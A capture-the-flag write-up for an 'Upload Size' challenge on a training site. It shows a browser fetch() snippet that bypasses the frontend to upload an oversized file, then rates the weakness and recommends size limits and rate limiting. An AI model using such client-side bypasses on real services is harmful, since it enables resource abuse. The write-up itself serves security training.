# Upload Size

## Methodology

1. Reused the file upload endpoint (`POST /file-upload`) identified while solving the
   "Upload Type" challenge.
2. Built a text file larger than 100 kB in memory and attempted to upload it directly via
   `fetch()`, bypassing the frontend form entirely:
```js
   const bigContent = 'A'.repeat(200 * 1024); // 200 kB
   const blob = new Blob([bigContent], { type: 'text/plain' });
   const file = new File([blob], 'big.txt', { type: 'text/plain' });
   const formData = new FormData();
   formData.append('file', file);

   fetch('https://ctf.juice.cyber.epitest.eu/file-upload', {
     method: 'POST',
     headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') },
     body: formData
   });
```
3. A 200 kB file was rejected by the server with `500 Internal Server Error` and the
   message "MulterError: File too large", revealing that a real server-side size limit
   exists (Multer being the Node.js middleware handling the upload).
4. Reduced the file size to 105 kB — just above the 100 kB threshold required by the
   challenge, but apparently still under the server's actual Multer limit.
5. This upload succeeded, and the challenge was marked as solved immediately.

Tools used: browser DevTools (Console), manual `fetch()` calls with in-memory `Blob`/
`File` objects of controlled size.

## Vulnerabilities

- **Oversized file upload allowed by server configuration** — the server does enforce a
  maximum upload size, but the configured threshold is larger than what is reasonably
  needed for the feature (a complaint attachment), allowing uploads well above 100 kB to
  succeed.
  - Affected component: file upload endpoint (`/file-upload`), Multer size limit
    configuration.
  - Severity: low to medium — not a direct data breach, but a resource-consumption and
    defense-in-depth weakness.

## Risks

- Attackers can upload files significantly larger than necessary for the feature's actual
  purpose, which can be abused to consume server storage and bandwidth, especially if
  repeated at scale (a basic denial-of-service vector).
- Combined with the lack of file-type validation (see "Upload Type" write-up), oversized
  uploads of arbitrary content increase the overall attack surface of the upload feature.
- Business impact: potential service degradation or increased infrastructure costs from
  storage/bandwidth abuse.

## Actions

- Set the maximum upload size to a value that reflects the actual business need for the
  feature (e.g. a small limit appropriate for a complaint attachment), rather than a
  generic, overly permissive default.
- Apply rate limiting on the upload endpoint to prevent rapid, repeated large uploads
  from a single account or IP address.
- Monitor storage usage and set alerts for unusual upload volume or size patterns.